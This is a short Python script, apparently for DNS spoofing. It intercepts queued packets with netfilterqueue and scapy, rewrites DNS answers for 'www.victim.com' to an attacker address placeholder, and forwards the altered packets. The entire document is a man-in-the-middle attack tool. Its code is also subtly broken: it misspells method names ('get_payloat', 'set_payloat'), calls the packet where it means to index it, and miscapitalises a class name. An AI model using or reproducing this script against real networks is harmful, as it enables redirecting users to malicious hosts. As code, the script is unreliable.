import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payloat())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet(scapy.DNSRR).qname
        if "www.victim.com" in qname:
            print('[INFO] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='yourIP')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payloat(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.Netfilterqueue()
queue.bind(0, process_packet)
queue.run()
